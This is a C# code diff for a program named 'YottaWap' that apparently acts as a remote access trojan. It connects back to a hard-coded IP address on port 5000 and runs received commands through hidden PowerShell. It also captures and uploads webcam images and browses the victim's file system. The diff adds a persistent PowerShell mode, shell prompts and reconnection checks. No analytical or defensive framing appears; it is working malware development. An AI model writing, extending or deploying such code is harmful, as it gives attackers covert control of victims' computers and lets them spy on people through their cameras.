@@ -35,6 +35,7 @@ namespace YottaWap
         string sessionPrefix = "";
         string remoteIp = "45.79.102.237";
         string shellWorkingDirectory = "C:\\";
+        bool powershellMode = false;
 
         public enum ErrorCodes
         {
@@ -208,10 +209,55 @@ namespace YottaWap
             return;
         }
 
+        bool IsConnected(TcpClient _tcpClient)
+        {
+            try
+            {
+                if (_tcpClient != null && _tcpClient.Client != null && _tcpClient.Client.Connected)
+                {
+                    /* pear to the documentation on Poll:
+                     * When passing SelectMode.SelectRead as a parameter to the Poll method it will return 
+                     * -either- true if Socket.Listen(Int32) has been called and a connection is pending;
+                     * -or- true if data is available for reading; 
+                     * -or- true if the connection has been closed, reset, or terminated; 
+                     * otherwise, returns false
+                     */
+
+                    // Detect if client disconnected
+                    if (_tcpClient.Client.Poll(0, SelectMode.SelectRead))
+                    {
+                        byte[] buff = new byte[1];
+                        if (_tcpClient.Client.Receive(buff, SocketFlags.Peek) == 0)
+                        {
+                            // Client disconnected
+                            return false;
+                        }
+                        else
+                        {
+                            return true;
+                        }
+                    }
+
+                    return true;
+                }
+                else
+                {
+                    return false;
+                }
+            }
+            catch
+            {
+                return false;
+            }
+        }
         string ExecutePowerShell(string command)
         {
             try
             {
+                if (command == null || command == "")
+                {
+                    return "";
+                }
                 Process p = new Process();
                 // Redirect the output stream of the child process.
                 p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
@@ -228,7 +274,7 @@ namespace YottaWap
                 // p.WaitForExit();
                 // Read the output stream first and then wait.
                 string output = p.StandardOutput.ReadToEnd();
-                p.WaitForExit();
+                p.WaitForExitAsync();
                 return output;
             }
             catch (Exception ex)
@@ -241,64 +287,83 @@ namespace YottaWap
             try
             {
                 command = command.Trim();
-                string[] parts = command.Split(' ');
-                switch (parts[0])
+                if (command != "mode default" && powershellMode)
                 {
-                    case "exe":
-                        return ExecutePowerShell(command.Substring(3));
-                    case "cam":
-                        string filePath = CaptureImage();
-                        UploadFile(filePath);
-                        break;
-                    case "ls":
-                        return string.Join("\n", Directory.GetFileSystemEntries(shellWorkingDirectory));
-                    case "cd":
-                        string moveTo = command.Substring(2).Replace("/", "\\").Trim();
-
-                        if (parts.Length == 1)
-                        {
-                            string? path = Environment.GetEnvironmentVariable("USERPROFILE");
-                            if (path != null)
+                    ExecutePowerShell(command);
+                }
+                else if (command == "mode default")
+                {
+                    powershellMode = false;
+                }
+                else
+                {
+                    string[] parts = command.Split(' ');
+                    switch (parts[0])
+                    {
+                        case "exe":
+                            return ExecutePowerShell(command.Substring(3));
+                        case "cam":
+                            string filePath = CaptureImage();
+                            UploadFile(filePath);
+                            break;
+                        case "mode":
+                            if (parts[1] == "ps")
                             {
-                                shellWorkingDirectory = path;
-                                return "";
+                                powershellMode = true;
+                            }
+                            break;
+                        case "ls":
+                            return string.Join("\n", Directory.GetFileSystemEntries(shellWorkingDirectory));
+                        case "cd":
+                            string moveTo = command.Substring(2).Replace("/", "\\").Trim();
+
+                            if (parts.Length == 1)
+                            {
+                                string? path = Environment.GetEnvironmentVariable("USERPROFILE");
+                                if (path != null)
+                                {
+                                    shellWorkingDirectory = path;
+                                    return "";
+                                }
+                                else
+                                {
+                                    return "%USERPROFILE% variable = null";
+                                }
+
+                            }
+                            if (!moveTo.Substring(1).StartsWith(":") && !moveTo.StartsWith("\\"))
+                            {
+                                if (shellWorkingDirectory.EndsWith("\\") && !moveTo.StartsWith("\\"))
+                                {
+                                    shellWorkingDirectory += moveTo;
+                                    break;
+                                }
+                                if (!shellWorkingDirectory.EndsWith("\\"))
+                                {
+                                    shellWorkingDirectory += "\\" + moveTo;
+                                    break;
+                                }
+                            }
+                            else if (moveTo.StartsWith("\\"))
+                            {
+                                shellWorkingDirectory = "C:\\";
                             }
                             else
                             {
-                                return "%USERPROFILE% variable = null";
+                                return "Invalid path: \"" + shellWorkingDirectory + moveTo + "\"";
                             }
-
-                        }
-                        if (!moveTo.Substring(1).StartsWith(":") && !moveTo.StartsWith("\\"))
-                        {
-                            if (shellWorkingDirectory.EndsWith("\\") && !moveTo.StartsWith("\\"))
-                            {
-                                shellWorkingDirectory += moveTo;
-                                break;
-                            }
-                            if (!shellWorkingDirectory.EndsWith("\\"))
-                            {
-                                shellWorkingDirectory += "\\" + moveTo;
-                                break;
-                            }
-                        }
-                        else if (moveTo.StartsWith("\\"))
-                        {
-                            shellWorkingDirectory = "C:\\";
-                        }
-                        else
-                        {
-                            return "Invalid path: \"" + shellWorkingDirectory + moveTo + "\"";
-                        }
-                        break;
+                            break;
+                    }
                 }
             }
             catch (Exception ex)
             {
+                WriteError(ex.Message);
                 return ex.Message;
             }
             return "";
         }
+
         int EnterLoop()
         {
 
@@ -325,7 +390,7 @@ namespace YottaWap
             {
                 try
                 {
-                    if (!client.Connected)
+                    if (!IsConnected(client))
                     {
                         client = new TcpClient();
                         client.Connect(remoteIp, 5000);
@@ -362,17 +427,24 @@ namespace YottaWap
                                 rdr.Dispose();
                                 Environment.Exit(2);
                             }
-                            if (command != "")
+
+                            if (command != null)
                             {
                                 string output = ExecuteCommand(command);
+                                string prefix = "SHELL ~$ ";
+                                if (powershellMode)
+                                {
+
+                                    prefix = "PS " + shellWorkingDirectory + "> ";
+                                }
                                 if (output != "")
                                 {
-                                    byte[] buffer = Encoding.UTF8.GetBytes(output + "\n");
+                                    byte[] buffer = Encoding.UTF8.GetBytes(output + "\n" + prefix);
                                     stream.Write(buffer, 0, buffer.Length);
                                 }
                                 else
                                 {
-                                    byte[] buffer = { 0x00 };
+                                    byte[] buffer = Encoding.UTF8.GetBytes(prefix);
                                     stream.Write(buffer, 0, buffer.Length);
                                 }
                             }
